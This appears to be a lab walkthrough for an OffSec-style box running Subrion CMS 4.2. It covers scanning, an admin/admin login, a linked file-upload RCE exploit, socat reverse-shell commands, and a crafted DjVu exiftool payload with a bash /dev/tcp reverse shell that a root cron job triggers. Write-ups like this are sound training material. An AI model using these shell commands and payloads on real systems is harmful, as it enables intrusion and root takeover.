22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-generator: Subrion CMS - Open Source Content Management System
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home :: Powered by Subrion 4.2
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<img width="1681" height="759" alt="image" src="https://github.com/user-attachments/assets/47bc4422-bebc-4c6d-b830-bfe17473cfae" />port 80. add exfiltrated.offsec to /etc/hosts
<img width="1681" height="759" alt="image" src="https://github.com/user-attachments/assets/eefcf809-72bc-48c2-b883-982d41258705" />
<img width="279" height="54" alt="image" src="https://github.com/user-attachments/assets/d774232c-8d57-4d6a-85d9-1c731db31935" />
Subrion 4.2 cms

robots.txt
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/

/panel
logged in with admin admin
<img width="1147" height="755" alt="image" src="https://github.com/user-attachments/assets/b3b2cdd3-6ee0-4813-8cbf-2cb3ea930b0f" />

use rce
https://github.com/Swammers8/SubrionCMS-4.2.1-File-upload-RCE-auth-/blob/main/exploit.py
<img width="892" height="390" alt="image" src="https://github.com/user-attachments/assets/1a556764-5eae-481b-ab15-30514ef05d22" />

<img width="177" height="58" alt="image" src="https://github.com/user-attachments/assets/96d1fb8c-daaf-4bb0-a52b-7992d37ceaac" />
upgrade shell
SOCAT
On the attacker machine, we started a listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

On the target machine, we executed the following command:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.227:4444

is mysql running?
tcp        0      0 127.0.0.1:3306 
crontab shows that it runs image-exif code. it basically runs exiftool on jpg files
<img width="968" height="564" alt="image" src="https://github.com/user-attachments/assets/f5acdc8f-ed7a-448c-8bd3-cb8eab33b77f" />

create exploit 
<img width="788" height="116" alt="image" src="https://github.com/user-attachments/assets/e24a8086-f4cf-40f6-a778-d64e4dabe966" />
<img width="1262" height="329" alt="image" src="https://github.com/user-attachments/assets/deb9d3f0-e3a5-41ed-af89-665d57266771" />


summary
 (metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.227/4444 0>&1\"')};")
 djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
sudo exiftool exploit.djvu


in our case we just uploaded the exploit.jpg file into the uploads folder. and the crontab runs it every minute giving us our reverse shell
